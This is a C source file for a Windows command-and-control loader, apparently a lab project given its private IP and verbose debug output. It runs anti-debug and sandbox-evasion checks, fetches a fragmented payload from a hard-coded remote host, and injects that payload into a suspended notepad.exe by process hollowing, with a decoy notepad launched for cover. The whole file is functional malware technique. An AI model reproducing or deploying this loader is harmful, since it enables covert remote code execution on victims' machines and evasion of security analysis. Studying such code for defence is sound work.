#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include "antidebug.h"
#include "checksandbox.h"

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024
#define MAX_FRAGMENTS 1000
#define PORT 8080
#define DEVICE_B_IP "192.168.116.129"

// Process Hollowing function prototypes
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

// Your get_local_ip function remains the same
char* get_local_ip() {
    static char ip[INET_ADDRSTRLEN];
    
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        fprintf(stderr, "Error getting hostname\n");
        return "127.0.0.1";
    }
    
    struct addrinfo hints, *result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0) {
        fprintf(stderr, "Error getting address info\n");
        return "127.0.0.1";
    }
    
    for (struct addrinfo *ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        struct sockaddr_in *addr = (struct sockaddr_in *)ptr->ai_addr;
        if (inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN) != NULL &&
            strncmp(ip, "127.", 4) != 0) {
            freeaddrinfo(result);
            return ip;
        }
    }
    
    freeaddrinfo(result);
    return "127.0.0.1";
}

// Process Hollowing implementation - integrated from process_hollowing.c
BOOL ProcessHollowing(const char* targetPath, unsigned char* payload, size_t payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    SIZE_T bytesRead, bytesWritten;
    
    // Parse payload PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)payload + dosHeader->e_lfanew);
    
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[ERROR] Invalid PE file format\n");
        return FALSE;
    }
    
    printf("[INFO] Entry Point: 0x%X\n", ntHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("[INFO] Image Base: 0x%p\n", (PVOID)ntHeaders->OptionalHeader.ImageBase);
    
    // Step 1: Create target process in suspended state
    printf("[STEP 1] Creating suspended process: %s\n", targetPath);
    
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[ERROR] Failed to create process. Error: %d\n", GetLastError());
        return FALSE;
    }
    
    printf("[SUCCESS] Process created with PID: %d (SUSPENDED)\n", pi.dwProcessId);
    
    // Step 2: Get thread context
    printf("[STEP 2] Getting thread context...\n");
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] Failed to get thread context\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Read PEB to get image base address
    PVOID pebImageBaseOffset = (PVOID)((ULONG_PTR)ctx.Rdx + 0x10);
    PVOID imageBase;
    
    if (!ReadProcessMemory(pi.hProcess, pebImageBaseOffset, 
                          &imageBase, sizeof(PVOID), &bytesRead)) {
        printf("[ERROR] Failed to read image base address\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[INFO] Original image base: 0x%p\n", imageBase);
    
    // Step 3: Unmap original executable
    printf("[STEP 3] Unmapping original executable...\n");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, imageBase);
        if (status == 0) {
            printf("[SUCCESS] Original image unmapped\n");
        }
    }
    
    // Step 4: Allocate memory for payload
    printf("[STEP 4] Allocating memory in target process...\n");
    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, 
                                         (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    
    if (!newImageBase) {
        newImageBase = VirtualAllocEx(pi.hProcess, NULL,
                                     ntHeaders->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    }
    
    if (!newImageBase) {
        printf("[ERROR] Failed to allocate memory\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] Memory allocated at: 0x%p\n", newImageBase);
    
    // Step 5: Write PE headers
    printf("[STEP 5] Writing PE headers...\n");
    if (!WriteProcessMemory(pi.hProcess, newImageBase, payload,
                           ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
        printf("[ERROR] Failed to write headers\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Step 6: Write PE sections
    printf("[STEP 6] Writing PE sections...\n");
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            LPVOID sectionDestination = (LPVOID)((ULONG_PTR)newImageBase + sectionHeader[i].VirtualAddress);
            LPVOID sectionSource = (LPVOID)((ULONG_PTR)payload + sectionHeader[i].PointerToRawData);
            
            if (!WriteProcessMemory(pi.hProcess, sectionDestination, sectionSource,
                                   sectionHeader[i].SizeOfRawData, &bytesWritten)) {
                printf("[ERROR] Failed to write section %s\n", sectionHeader[i].Name);
                TerminateProcess(pi.hProcess, 0);
                return FALSE;
            }
        }
    }
    
    printf("[SUCCESS] All sections written\n");
    
    // Step 7: Update entry point and PEB
    printf("[STEP 7] Updating thread context...\n");
    
    ULONG_PTR entryPoint = (ULONG_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    ctx.Rcx = entryPoint;
    
    if (!WriteProcessMemory(pi.hProcess, pebImageBaseOffset, &newImageBase,
                           sizeof(PVOID), &bytesWritten)) {
        printf("[ERROR] Failed to update PEB\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] Failed to set thread context\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Step 8: Resume thread
    printf("[STEP 8] Resuming thread...\n");
    
    if (ResumeThread(pi.hThread) == -1) {
        printf("[ERROR] Failed to resume thread\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] Process hollowing complete - Payload executing!\n");
    
    // Wait for completion
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("[INFO] Payload exited with code: %d\n", exitCode);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

// Modified C2 client function with process hollowing
void run_c2_client() {
    // ===== SECURITY CHECKS - ADD THIS SECTION =====
    printf("\n========================================\n");
    printf("PERFORMING ANTI-DEBUG CHECKS\n");
    printf("========================================\n");
    InitAntiDebug();
    
    // Test some API calls to verify monitoring is working (Currently empty)
 


    
    // SANDBOX CHECK
    printf("\n========================================\n");
    printf("PERFORMING SANDBOX DETECTION\n");
    printf("========================================\n");
    int sandbox_result = check_sandbox();

    // For testing, force no sandbox detected, comment if detection wanted
    sandbox_result = 0;  
    
    if (sandbox_result) {
        printf("\n[CRITICAL] SANDBOX DETECTED! Terminating...\n");
        PrintAntiDebugStats();
        Sleep(2000);
        exit(-1);
    }
    
    printf("\n[OK] Environment checks passed\n");
    printf("========================================\n\n");
    PrintAntiDebugStats();
    // ===== END OF SECURITY CHECKS =====
    
    SOCKET sock, server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr, listen_addr;
    int addr_len = sizeof(struct sockaddr_in);
    char buffer[BUFFER_SIZE];
    char *local_ip;
    char request[BUFFER_SIZE];
    char *fragments[MAX_FRAGMENTS];
    int fragment_sizes[MAX_FRAGMENTS];
    int num_fragments = 0;
    int total_size = 0;
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return;
    }
    
    local_ip = get_local_ip();
    if (!local_ip) {
        fprintf(stderr, "Failed to get local IP address\n");
        WSACleanup();
        return;
    }
    
    printf("Using Device B IP address: %s\n", DEVICE_B_IP);
    
    // Create socket for sending request
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    
    if (inet_pton(AF_INET, DEVICE_B_IP, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid address\n");
        closesocket(sock);
        WSACleanup();
        return;
    }
    
    // Connect to Device B
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }
    
    snprintf(request, BUFFER_SIZE, "REQUEST_PAYLOAD %s", local_ip);
    send(sock, request, (int)strlen(request), 0);
    printf("Request sent to Device B (%s)\n", DEVICE_B_IP);
    
    closesocket(sock);
    
    // Create socket for receiving fragments
    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }
    
    BOOL opt = TRUE;
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) < 0) {
        fprintf(stderr, "Setsockopt failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    memset(&listen_addr, 0, sizeof(listen_addr));
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(PORT + 1);
    
    if (bind(server_sock, (struct sockaddr *)&listen_addr, sizeof(listen_addr)) < 0) {
        fprintf(stderr, "Bind failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    if (listen(server_sock, 5) < 0) {
        fprintf(stderr, "Listen failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    printf("Listening for fragments on port %d...\n", PORT + 1);
    
    if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len)) == INVALID_SOCKET) {
        fprintf(stderr, "Accept failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
    printf("Connection from %s\n", client_ip);
    
    // Receive fragments
    while (1) {
        int bytes_received = recv(client_sock, buffer, BUFFER_SIZE, 0);
        
        if (bytes_received <= 0) {
            break;
        }
        
        if (strncmp(buffer, "END_OF_TRANSMISSION", 19) == 0) {
            printf("End of transmission received\n");
            break;
        }
        
        fragments[num_fragments] = (char*)malloc(bytes_received);
        if (!fragments[num_fragments]) {
            fprintf(stderr, "Memory allocation failed\n");
            break;
        }
        
        memcpy(fragments[num_fragments], buffer, bytes_received);
        fragment_sizes[num_fragments] = bytes_received;
        total_size += bytes_received;
        
        printf("Received fragment %d of size %d bytes\n", num_fragments + 1, bytes_received);
        
        num_fragments++;
        if (num_fragments >= MAX_FRAGMENTS) {
            printf("Maximum number of fragments reached\n");
            break;
        }
    }
    
    // Combine fragments
    unsigned char *complete_payload = (unsigned char*)malloc(total_size);
    if (!complete_payload) {
        fprintf(stderr, "Memory allocation for complete payload failed\n");
    } else {
        int offset = 0;
        for (int i = 0; i < num_fragments; i++) {
            memcpy(complete_payload + offset, fragments[i], fragment_sizes[i]);
            offset += fragment_sizes[i];
        }
        
        printf("Complete payload received: %d bytes total\n", total_size);
        
        // Use Process Hollowing instead of direct execution
        printf("\n=== INITIATING PROCESS HOLLOWING ===\n");
        const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";
        
        if (ProcessHollowing(targetProcess, complete_payload, total_size)) {
            printf("Process hollowing completed successfully\n");
        } else {
            printf("Process hollowing failed\n");
        }
        
        free(complete_payload);
    }
    
    // Clean up
    for (int i = 0; i < num_fragments; i++) {
        free(fragments[i]);
    }
    closesocket(client_sock);
    closesocket(server_sock);
    WSACleanup();
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Check if we're running as the C2 client subprocess
    if (lpCmdLine && strstr(lpCmdLine, "c2mode") != NULL) {
        AllocConsole();
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
        
        run_c2_client();
        
        printf("Press Enter to exit...\n");
        getchar();
        return 0;
    }
    
    // ===== LAUNCHER MODE SECURITY CHECKS - ADD THIS SECTION =====
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    
    printf("\n========================================\n");
    printf("LAUNCHER MODE - SECURITY CHECKS\n");
    printf("========================================\n");
    
    InitAntiDebug();
    
    printf("\n--- Testing Anti-Debug Monitoring ---\n");

    
    printf("\n--- Running Sandbox Detection ---\n");
    int sandbox_result = check_sandbox();

    // For testing, force no sandbox detected, comment if detection wanted
    sandbox_result = 0;
    
    if (sandbox_result) {
        printf("\n[CRITICAL] SANDBOX DETECTED IN LAUNCHER! Aborting...\n");
        PrintAntiDebugStats();
        MessageBox(NULL, "Application cannot run in this environment", "Error", MB_OK | MB_ICONERROR);
        Sleep(3000);
        return -1;
    }
    
    printf("\n[OK] Launcher environment checks passed\n");
    printf("========================================\n\n");
    PrintAntiDebugStats();
    
    Sleep(2000);  // Give user time to see results
    // ===== END OF SECURITY CHECKS =====
    
    // Main launcher mode
    STARTUPINFO si_c2 = {sizeof(si_c2)};
    PROCESS_INFORMATION pi_c2;
    si_c2.dwFlags = STARTF_USESHOWWINDOW;
    si_c2.wShowWindow = SW_SHOW;
    
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    
    char cmdLine[MAX_PATH + 20];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" c2mode", exePath);
    
    printf("Launching C2 client subprocess...\n");
    
    if (CreateProcess(
        NULL, cmdLine,
        NULL, NULL, FALSE,
        0, NULL, NULL,
        &si_c2, &pi_c2
    )) {
        printf("C2 client subprocess created successfully\n");
        CloseHandle(pi_c2.hProcess);
        CloseHandle(pi_c2.hThread);
    } else {
        printf("Failed to create C2 client subprocess\n");
    }
    
    // Launch notepad as decoy
    printf("Launching decoy notepad...\n");
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    CreateProcess(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        0, NULL, NULL, &si, &pi
    );
    
    if (pi.hProcess) {
        printf("Decoy notepad launched\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return 0;
}


